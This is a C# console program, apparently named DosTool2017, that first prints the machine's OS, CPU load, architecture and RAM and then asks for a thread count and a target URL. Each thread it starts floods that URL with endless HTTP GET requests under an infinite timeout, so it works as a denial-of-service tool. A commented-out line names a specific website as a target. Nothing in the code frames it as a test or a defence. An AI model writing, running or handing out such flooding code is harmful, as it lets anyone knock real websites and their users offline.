using System;
using System.Net.Http;
using System.Threading;
using Microsoft.VisualBasic.Devices;
using System.Management;
using System.ComponentModel;

namespace DosTool2017
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(new ComputerInfo().OSFullName);
            ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                Console.WriteLine(mo["Name"]);
                int load = int.Parse(mo["LoadPercentage"].ToString());
                Console.Write("Processor load: ");
                if(load > 75)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                else if(load > 50)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                Console.Write("{0,11}",load);
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("%");
                Console.WriteLine("{0,0} {1,2}", "Processor Architecture: ", getArch(int.Parse(mo["Architecture"].ToString())));
            }
            double total = Math.Round(new ComputerInfo().TotalPhysicalMemory / Math.Pow(1024, 3), 2);
            Console.WriteLine("{0,0} {1,20}","RAM total: ", total + "GB");
            double free = Math.Round(new ComputerInfo().AvailablePhysicalMemory / Math.Pow(1024, 3), 2);
            Console.Write("RAM free: ");
            if(free/total < 0.25)
            {
                Console.ForegroundColor = ConsoleColor.Red;
            }
            else if (free/total < 0.5)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
            }
            Console.Write("{0,20}", free);
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("GB");
            Console.WriteLine("");
            Console.WriteLine("Number of threads:  ");
            int count = Int32.Parse(Console.ReadLine());
            Console.WriteLine("Target URL:  ");
            //string url = "https://tuinweer.be";
            string url = Console.ReadLine();
            Thread[] threads = new Thread[count];
            for (int i = 0; i < count; i++)
            {
                int x = i;
                threads[i] = new Thread(() => Program.DosThread(x, url));
                threads[i].Start();
            }
            Thread.Sleep(50);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("All threads active");
            Console.WriteLine("Press key to stop");
            Console.ReadLine();
        }

        private static string getArch(int architectureNumber)
        {
            switch (architectureNumber)
            {
                case 0: return "x86";
                case 1: return "MIPS";
                case 2: return "Alpha";
                case 3: return "PowerPC";
                case 5: return "ARM";
                case 6: return "Itanium-based systems";
                case 9: return "x64";
                default:
                    return "Unkown";
            }
        }

        public static async void DosThread(int num, string url)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Thread " + num + " active    " + url);
            while (true)
            {
                //do the HTTP request
                using (var dosserclient = new HttpClient())
                {
                    try
                    {
                        dosserclient.Timeout = Timeout.InfiniteTimeSpan;
                        while (true)
                        {
                            await dosserclient.GetAsync(url);
                        }
                    }
                    catch (HttpRequestException e)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[" + DateTime.Now.ToString("h:mm:ss.") + DateTime.Now.Millisecond + "] " + e.InnerException.Message);
                    }

                }
                GC.Collect();
            }

        }
    }
}
